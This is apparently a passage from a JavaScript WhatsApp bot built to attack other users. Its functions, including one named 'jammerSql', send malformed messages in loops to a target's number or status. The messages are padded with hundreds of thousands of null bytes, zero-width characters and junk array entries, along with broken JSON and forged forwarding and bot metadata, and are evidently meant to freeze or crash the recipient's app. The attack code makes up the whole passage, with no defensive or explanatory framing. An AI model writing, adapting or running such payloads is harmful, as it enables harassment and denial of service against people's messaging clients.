          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "999999999",
          stickerPackOrigin: "USER_CREATED",
        }
      }
    }
  }, {});
  
  await sock.relayMessage(jid, msg.message, {
    participant: { 
      jid: jid 
    }, 
    messageId: msg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "3",
              name: "galaxy_message"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}

async function jammerSql(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(
      "status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: " 💤⃟⃰ᰧ./vinz3phyr¡ne.𝛆𝛘𝛆 ϟ ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{",
            version: 3
          },
          contextInfo: {
            remoteJid: Math.random().toString(36) + " !¡Tr4sh.cor3x¡! ",
            isForwarded: true,
            forwardingScore: 999,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                "\0": "\0"
              }))
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    await sock.relayMessage(
      "status@broadcast",
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
              },
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: "status@broadcast",
                fromMe: true,
                forwardedAiBotMessageInfo: {
                  botJid: "13135550202@bot",
                  botName: "Business Assistant",
                  creator: "💤⃟⃰ᰧ./vinz3phyr¡ne.𝛆𝛘𝛆 ϟ"
                },
                statusAttributionType: 2,
                statusAttributions: Array.from(
                  { length: 209000 },
                  (_, index) => ({
                    participant: "62" + (index + 720599) + "@s.whatsapp.net",
                    type: 1
                  })
                ),
                participant: sock.user.id
              },
              body: {
                text: "💤⃟⃰ᰧ./vinz3phyr¡ne.𝛆𝛘𝛆 ϟ",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "{",
                version: 3
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    await sleep(1500);
  }
}

async function tesss(sock, target) {
    const kel = "\u0000".repeat(90000) + "ꦽ".repeat(10000)
    let q
    let Msg
    for (let i = 0; i < 1000; i++) {
        let mentions = [
            "13651718@s.whatsapp.net",
            ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
        ]
        const msg = generateWAMessageFromContent(
            target,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "kelra - kikuk",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "\u200B".repeat(10000)
                            },
                            footer: {
                                text: "\u200B".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "\u0000".repeat(90000),
                                            id: "x500"
                                        })
                                    }
                                ]
                            }
                        }
                    }
                },
                pollCreationMessageV4: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessageV3: {
                            name: "ꦽꦽꦽ" + "\u200B".repeat(20000),
                            options: [
                                {
                                    optionName: "\u200B".repeat(10000)
                                },
                                {
                                    optionName: "ꦽ".repeat(10000)
                                }
                            ],
                            selectableOptionsCount: 1
                        }
                    }
                },
                buttonsResponseMessage: {
                    selectedButtonId: "payment_info",
                    selectedDisplayText: "#",
                    contextInfo: {
                        participant: target,
                        mentionedJid: mentions,
                        isForwarded: true,
                        forwardingScore: 9999,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 1900 }, () => ({}))
                        }
                    }
                }

            }),
            {}
        )
        q = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                id: "MAIN-" + Math.floor(Math.random() * 999999999),
                participant: "0@s.whatsapp.net"
            },
            message: {
                conversation: kel,
                extendedTextMessage: {
                    text: kel,
                    contextInfo: {
                        mentionedJid: mentions,
                        stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                        participant: "0@s.whatsapp.net"
                    }
                },
                buttonsResponseMessage: msg.message.buttonsResponseMessage,
                pollCreationMessageV4: msg.message.pollCreationMessageV4,
                viewOnceMessage: msg.message.viewOnceMessage
            }
        }
    }
    for (let i = 0; i < 1000; i++) {
        Msg = {
            call: {
                callType: 2,
                callId: String(Date.now()),
                callStartTimestamp: Date.now(),
                contextInfo: {
                    forwardingScore: 999999,
                    isForwarded: true,
                    stanzaId: "ctx-" + Date.now(),
                    participant: "0@s.whatsapp.net",
                    remoteJid: target,
                    mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        )
                    ],
                    entryPointConversionSource: "global_search_new_chat",
                    entryPointConversionApp: "com.whatsapp",
                    entryPointConversionDelaySeconds: 1,
                    quotedMessage: q.message
                }
            }
        }
    }

    await sock.relayMessage(target, Msg, { quote: q })
}


bot.launch()
